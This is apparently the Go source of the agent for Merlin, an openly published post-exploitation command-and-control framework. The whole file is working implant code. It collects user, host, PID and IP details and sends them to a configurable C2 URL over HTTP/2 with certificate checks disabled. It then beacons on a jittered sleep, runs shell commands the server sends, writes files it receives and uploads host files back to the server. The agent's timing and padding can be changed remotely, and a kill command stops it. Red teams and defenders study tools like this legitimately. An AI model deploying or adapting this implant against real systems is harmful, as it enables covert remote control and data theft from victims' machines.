// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2018  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package main

import (
	// Standard
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"time"
	"crypto/sha1"
	"io"
	"path/filepath"

	// 3rd Party
	"github.com/fatih/color"
	"github.com/satori/go.uuid"
	"golang.org/x/net/http2"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg"
	"github.com/Ne0nd0g/merlin/pkg/agent"
	"github.com/Ne0nd0g/merlin/pkg/messages"
)

// GLOBAL VARIABLES

var debug = false
var verbose = false
var mRun = true
var hostUUID = uuid.NewV4()
var url = "https://127.0.0.1:443/"
var h2Client = getH2WebClient()
var waitSkew int64 = 30000
var waitTime = 30000 * time.Millisecond
var agentShell = ""
var paddingMax = 4096
var src = rand.NewSource(time.Now().UnixNano())
var build = "nonRelease"
var maxRetry = 7
var failedCheckin = 0
var initial = false

// Constants
const (
	letterIdxBits = 6                    // 6 bits to represent a letter index
	letterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits
	letterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits
	letterBytes   = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
)

func main() {

	flag.BoolVar(&verbose, "v", false, "Enable verbose output")
	flag.BoolVar(&debug, "debug", false, "Enable debug output")
	flag.StringVar(&url, "url", url, "Full URL for agent to connect to")
	flag.Int64Var(&waitSkew, "skew", 3000, "Variable time skew for agent to sleep")
	flag.DurationVar(&waitTime, "sleep", 30000*time.Millisecond, "Time for agent to sleep")
	flag.Usage = usage
	flag.Parse()

	rand.Seed(time.Now().UTC().UnixNano())

	if verbose {
		color.Yellow("[-]Agent version: %s", merlin.Version)
		color.Yellow("[-]Agent build: %s", build)
	}

	for mRun {
		if initial {
			if verbose {
				color.Yellow("[-]Checking in")
			}
			statusCheckIn(url, h2Client)
		} else {
			initial = initialCheckIn(url, h2Client)
			if initial {
				agentInfo(url, h2Client)
			}
		}
		if failedCheckin >= maxRetry {
			os.Exit(1)
		}
		timeSkew := time.Duration(rand.Int63n(waitSkew)) * time.Millisecond
		totalWaitTime := waitTime + timeSkew
		if verbose {
			color.Yellow("[-]Sleeping for %s at %s", totalWaitTime.String(), time.Now())
		}
		time.Sleep(totalWaitTime)
	}
}

func initialCheckIn(host string, client *http.Client) bool {
	u, errU := user.Current()
	if errU != nil {
		if debug {
			color.Red("[!]There was an error getting the username")
			color.Red(errU.Error())
		}
	}

	h, errH := os.Hostname()
	if errH != nil {
		if debug {
			color.Red("[!]There was an error getting the hostname")
			color.Red(errH.Error())
		}
	}

	var ips []string
	interfaces, errI := net.Interfaces()
	if errI == nil {
		for _, iface := range interfaces {
			addrs, err := iface.Addrs()
			if err == nil {
				for _, addr := range addrs {
					ips = append(ips, addr.String())
				}
			}
		}
	} else {
		if debug {
			color.Red("[!]There was an error getting the the IP addresses")
			color.Red(errI.Error())
		}
	}

	if verbose {
		color.Green("[+]Host Information:")
		color.Green("\tAgent UUID: %s", hostUUID)
		color.Green("\tPlatform: %s", runtime.GOOS)
		color.Green("\tArchitecture: %s", runtime.GOARCH)
		color.Green("\tUser Name: %s", u.Username) //TODO A username like _svctestaccont causes error
		color.Green("\tUser GUID: %s", u.Gid)
		color.Green("\tHostname: %s", h)
		color.Green("\tPID: %d", os.Getpid())
		color.Green("\tIPs: %v", ips)
	}

	// JSON "initial" payload object
	i := messages.SysInfo{
		Platform:     runtime.GOOS,
		Architecture: runtime.GOARCH,
		UserName:     u.Username,
		UserGUID:     u.Gid,
		HostName:     h,
		Pid:          os.Getpid(),
		Ips:          ips,
	}

	payload, errP := json.Marshal(i)

	if errP != nil {
		if debug {
			color.Red("[!]There was an error marshaling the JSON object")
			color.Red(errP.Error())
		}
	}

	// JSON message to be sent to the server
	g := messages.Base{
		Version: 1.0,
		ID:      hostUUID,
		Type:    "InitialCheckIn", // Can set this to a constant in messages.go
		Payload: (*json.RawMessage)(&payload),
		Padding: randStringBytesMaskImprSrc(paddingMax),
	}

	b := new(bytes.Buffer)
	json.NewEncoder(b).Encode(g)
	if verbose {
		color.Yellow("[-]Connecting to web server at %s for initial check in.", host)
	}
	resp, err := client.Post(host, "application/json; charset=utf-8", b)

	if err != nil {
		failedCheckin++
		if debug {
			color.Red("[!]There was an error with the HTTP client while performing a POST:")
			color.Red(err.Error())
		}
		if verbose {
			color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)
		}
		return false
	}
	if debug {
		color.Red("[debug]HTTP Response:")
		color.Red("[debug]%s", resp)
	}
	if resp.StatusCode != 200 {
		failedCheckin++
		if verbose {
			color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)
		}
		if debug {
			color.Red("[!]There was an error communicating with the server!")
			color.Red("[!]Received HTTP Status Code: %d", resp.StatusCode)
		}
		return false
	}
	failedCheckin = 0
	return true
}

func statusCheckIn(host string, client *http.Client) {
	g := messages.Base{
		Version: 1.0,
		ID:      hostUUID,
		Type:    "StatusCheckIn",
		Padding: randStringBytesMaskImprSrc(paddingMax),
	}

	b := new(bytes.Buffer)
	json.NewEncoder(b).Encode(g)

	if verbose {
		color.Yellow("[-]Connecting to web server at %s for status check in.", host)
	}

	resp, err := client.Post(host, "application/json; charset=utf-8", b)

	if err != nil {
		if debug {
			color.Red("[!]There was an error with the HTTP Response:")
			color.Red(err.Error()) // On Mac I get "read: connection reset by peer" here but not on other platforms
		} // Only does this with a 10s Sleep
		failedCheckin++
		if verbose {
			color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)
		}
		return
	}

	if debug {
		color.Red("%s", "[DEBUG]HTTP Response:")
		color.Red("[DEBUG]ContentLength: %d", resp.ContentLength)
		color.Red("[DEBUG]%s", resp)
	}

	if resp.StatusCode != 200 {
		failedCheckin++
		if verbose {
			color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)
		}
		if debug {
			color.Red("[!]There was an error communicating with the server!")
			color.Red("[!]Received HTTP Status Code: %d", resp.StatusCode)
		}
		return
	}

	failedCheckin = 0

	if resp.ContentLength != 0 {
		var payload json.RawMessage
		j := messages.Base{
			Payload: &payload,
		}
		json.NewDecoder(resp.Body).Decode(&j)

		if debug {
			color.Red("[DEBUG]Agent ID: %s", j.ID)
			color.Red("[DEBUG]Message Type: %s", j.Type)
			color.Red("[DEBUG]Message Payload: %s", j.Payload)
		} else if verbose {
			color.Green("%s Message Type Received!", j.Type)
		}
		switch j.Type { // TODO add self destruct that will find the .exe current path and start a new process to delete it after initial sleep
		case "FileTransfer":
			var p messages.FileTransfer
			json.Unmarshal(payload, &p)

			g := messages.Base{
				Version: 1.0,
				ID:      j.ID,
				Padding: randStringBytesMaskImprSrc(paddingMax),
			}

			// Agent will be downloading a file from the server
			if p.IsDownload {
				if verbose {color.Green("FileTransfer type: Download")}
				// Setup the message to submit the status of the upload
				c := messages.CmdResults{
					Job:    p.Job,
					Stdout: "",
					Stderr: "",
				}

				d, _ := filepath.Split(p.FileLocation)
				_, directoryPathErr := os.Stat(d)
				if directoryPathErr != nil {
					if verbose {
						color.Red("[!]There was an error getting the FileInfo structure for the directory %s", d)
						color.Red(directoryPathErr.Error())
					}
					c.Stderr = fmt.Sprintf("[!]There was an error getting the FileInfo structure for the " +
						"remote directory %s:\r\n", p.FileLocation)
					c.Stderr += fmt.Sprintf(directoryPathErr.Error())
				}
				if c.Stderr == "" {
					if verbose {
						color.Yellow("[-]Writing file to %s", p.FileLocation)
					}
					downloadFile, downloadFileErr := base64.StdEncoding.DecodeString(p.FileBlob)
					if downloadFileErr != nil {
						c.Stderr = downloadFileErr.Error()
						if verbose {
							color.Red("[!]There was an error decoding the fileBlob")
							color.Red(downloadFileErr.Error())
						}
					} else {
						errF := ioutil.WriteFile(p.FileLocation, downloadFile, 0644)
						if errF != nil {
							c.Stderr = err.Error()
							if verbose {
								color.Red("[!]There was an error writing to : %s", p.FileLocation)
								color.Red(errF.Error())
							}
						} else {
							if verbose {
								color.Green("[+]Successfully download file to %s", p.FileLocation)
							}
							c.Stdout = fmt.Sprintf("Successfully uploaded file to %s on agent", p.FileLocation)
						}
					}
				}

				k, _ := json.Marshal(c)
				g.Type = "CmdResults"
				g.Payload = (*json.RawMessage)(&k)
			}

			// Agent will uploading a file to the server
			if !p.IsDownload {
				if verbose {color.Green("FileTransfer type: Upload")}

				fileData, fileDataErr := ioutil.ReadFile(p.FileLocation)
				if fileDataErr != nil {
					if verbose {
						color.Red("[!]There was an error reading %s", p.FileLocation)
						color.Red(fileDataErr.Error())
					}
					errMessage := fmt.Sprintf("[!]There was an error reading %s\r\n", p.FileLocation)
					errMessage += fileDataErr.Error()
					c := messages.CmdResults{
						Job:    p.Job,
						Stderr: errMessage,
					}
					if verbose {
						color.Yellow("[-]Sending error message to sever.")
					}
					k, _ := json.Marshal(c)
					g.Type = "CmdResults"
					g.Payload = (*json.RawMessage)(&k)

				} else {
					fileHash := sha1.New()
					io.WriteString(fileHash, string(fileData))

					if verbose {
						color.Yellow("[-]Uploading file %s of size %d bytes and a SHA1 hash of %x to the server",
							p.FileLocation,
							len(fileData),
							fileHash.Sum(nil))
					}
					c := messages.FileTransfer{
						FileLocation: p.FileLocation,
						FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
						IsDownload:   true,
						Job:          p.Job,
					}

					k, _ := json.Marshal(c)
					g.Type = "FileTransfer"
					g.Payload = (*json.RawMessage)(&k)

				}
			}
			b2 := new(bytes.Buffer)
			json.NewEncoder(b2).Encode(g)
			resp2, respErr := client.Post(host, "application/json; charset=utf-8", b2)
			if respErr != nil {
				if verbose {
					color.Red("There was an error sending the FileTransfer message to the server")
					color.Red(respErr.Error())
				}
			}
			if resp2.StatusCode != 200 {
				color.Red("Message error from server. HTTP Status code: %d", resp2.StatusCode)
			}

		case "CmdPayload":
			var p messages.CmdPayload
			json.Unmarshal(payload, &p)
			stdout, stderr := executeCommand(p) // TODO this needs to be its own routine so the agent can continue to function while it is going

			c := messages.CmdResults{
				Job:    p.Job,
				Stdout: stdout,
				Stderr: stderr,
			}

			k, _ := json.Marshal(c)
			g := messages.Base{
				Version: 1.0,
				ID:      j.ID,
				Type:    "CmdResults",
				Payload: (*json.RawMessage)(&k),
				Padding: randStringBytesMaskImprSrc(paddingMax),
			}
			b2 := new(bytes.Buffer)
			json.NewEncoder(b2).Encode(g)
			if verbose {
				color.Yellow("Sending response to server: %s", stdout)
			}
			resp2, _ := client.Post(host, "application/json; charset=utf-8", b2)
			if resp2.StatusCode != 200 {
				color.Red("Message error from server. HTTP Status code: %d", resp2.StatusCode)
			}
		case "ServerOk":
			if verbose {
				color.Yellow("[-]Received Server OK, doing nothing")
			}
		case "AgentControl":
			if verbose {
				color.Yellow("[-]Received Agent Control Message")
			}
			var p messages.AgentControl
			json.Unmarshal(payload, &p)

			switch p.Command {
			case "kill":
				if verbose {
					color.Yellow("[-]Received Agent Kill Message")
				}
				os.Exit(0)
			case "sleep":
				if verbose {
					color.Yellow("[-]Setting agent sleep time to %s milliseconds", p.Args)
				}
				t, err := time.ParseDuration(p.Args)
				if err != nil {
					if verbose {
						color.Red("[!]There was an error changing the agent waitTime")
						color.Red(err.Error())
					}
				}
				if t > 0 {
					waitTime = t
					agentInfo(host, client)
				} else {
					if verbose {
						color.Red("[!]The agent was provided with a time that was not greater than zero.")
						color.Red("The provided time was: %s", t.String())
					}
				}
			case "skew":
				t, err := strconv.ParseInt(p.Args, 10, 64)
				if err != nil {
					if verbose {
						color.Red("[!]There was an error changing the agent skew interval")
					}
				}
				if verbose {
					color.Yellow("[-]Setting agent skew interval to %d", t)
				}
				waitSkew = t
				agentInfo(host, client)
			case "padding":
				t, err := strconv.Atoi(p.Args)
				if err != nil {
					if verbose {
						color.Red("[!]There was an error changing the agent message padding size")
					}
				}
				if verbose {
					color.Yellow("[-]Setting agent message maximum padding size to %d", t)
				}
				paddingMax = t
				agentInfo(host, client)
			case "initialize":
				if verbose {
					color.Yellow("[-]Received agent re-initialize message")
				}
				initial = false
			case "maxretry":

				t, err := strconv.Atoi(p.Args)
				if err != nil {
					if verbose {
						color.Red("[!]There was an error changing the agent max retries")
					}
				}
				if verbose {
					color.Yellow("[-]Setting agent max retries to %d", t)
				}
				maxRetry = t
				agentInfo(host, client)
			default:
				if verbose {
					color.Red("[!}Unknown AgentControl message type received %s", p.Command)
				}
			}
		default:
			color.Red("Received unrecognized message type: %s", j.Type)
		}
	}
}

func getH2WebClient() *http.Client {

	// Setup TLS Configuration
	tr := &http2.Transport{
		TLSClientConfig: &tls.Config{
			MinVersion:               tls.VersionTLS12,
			InsecureSkipVerify:       true,
			PreferServerCipherSuites: false,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			},
			NextProtos: []string{"h2"},
		},
		DisableCompression: false,
	}

	// Setup HTTP Client Configuration
	client := &http.Client{
		Transport: tr,
	}
	return client
}

func executeCommand(j messages.CmdPayload) (stdout string, stderr string) {
	if debug {
		color.Red("[DEBUG]Received input parameter for executeCommand function: %s", j)

	} else if verbose {
		color.Green("Executing command %s %s %s", agentShell, j.Command, j.Args)
	}

	stdout, stderr = agent.ExecuteCommand(j.Command, j.Args)

	if verbose {
		if stderr != "" {
			color.Red("[!]There was an error executing the command: %s", j.Command)
			color.Green(stdout)
			color.Red("Error: %s", stderr)

		} else {
			color.Green("Command output:\r\n\r\n%s", stdout)
		}
	}

	return stdout, stderr // TODO return if the output was stdout or stderr and color stderr red on server
}

func usage() {
	fmt.Fprintf(os.Stderr, "usage: go run agent -v -debug\n")
	flag.PrintDefaults()
	os.Exit(2)
}

func randStringBytesMaskImprSrc(n int) string {
	// http://stackoverflow.com/questions/22892120/how-to-generate-a-random-string-of-a-fixed-length-in-golang
	b := make([]byte, n)
	// A src.Int63() generates 63 random bits, enough for letterIdxMax characters!
	for i, cache, remain := n-1, src.Int63(), letterIdxMax; i >= 0; {
		if remain == 0 {
			cache, remain = src.Int63(), letterIdxMax
		}
		if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
			b[i] = letterBytes[idx]
			i--
		}
		cache >>= letterIdxBits
		remain--
	}

	return string(b)
}

func agentInfo(host string, client *http.Client) {
	i := messages.AgentInfo{
		Version:       merlin.Version,
		Build:         build,
		WaitTime:      waitTime.String(),
		PaddingMax:    paddingMax,
		MaxRetry:      maxRetry,
		FailedCheckin: failedCheckin,
		Skew:		   waitSkew,
	}

	payload, errP := json.Marshal(i)

	if errP != nil {
		if debug {
			color.Red("[!]There was an error marshaling the JSON object")
			color.Red(errP.Error())
		}
	}

	g := messages.Base{
		Version: 1.0,
		ID:      hostUUID,
		Type:    "AgentInfo",
		Payload: (*json.RawMessage)(&payload),
		Padding: randStringBytesMaskImprSrc(paddingMax),
	}

	b := new(bytes.Buffer)
	json.NewEncoder(b).Encode(g)
	if verbose {
		color.Yellow("[-]Connecting to web server at %s to update agent configuration information.", host)
	}
	resp, err := client.Post(host, "application/json; charset=utf-8", b)

	if err != nil {
		failedCheckin++
		if debug {
			color.Red("[!]There was an error with the HTTP client while performing a POST:")
			color.Red(err.Error())
		}
		if verbose {
			color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)
		}
		return
	}
	if debug {
		color.Red("[DEBUG]HTTP Response:")
		color.Red("[DEBUG]%s", resp)
	}
	if resp.StatusCode != 200 {
		failedCheckin++
		if verbose {
			color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)
		}
		if debug {
			color.Red("[!]There was an error communicating with the server!")
			color.Red("[!]Received HTTP Status Code: %d", resp.StatusCode)
		}
		return
	}
	failedCheckin = 0
}

/*

1. POST System Enumeration Information and receive back JSON object w/ additional instructions
2. Sleep
3. Check in w/ Server
4. Execute commands if provided by server
5. Return results to server
6. Sleep and Check In
*/

// TODO add cert stapling
// TODO set message jitter
// TODO get and return IP addresses with initial checkin
// TODO Update Makefile to remove debug stacktrace for agents only. GOTRACEBACK=0 #https://dave.cheney.net/tag/gotraceback https://golang.org/pkg/runtime/debug/#SetTraceback
// TODO Add standard function for printing messages like in the JavaScript agent. Make it a lib for agent and server?
// TODO send cmdResult for agentcontrol messages
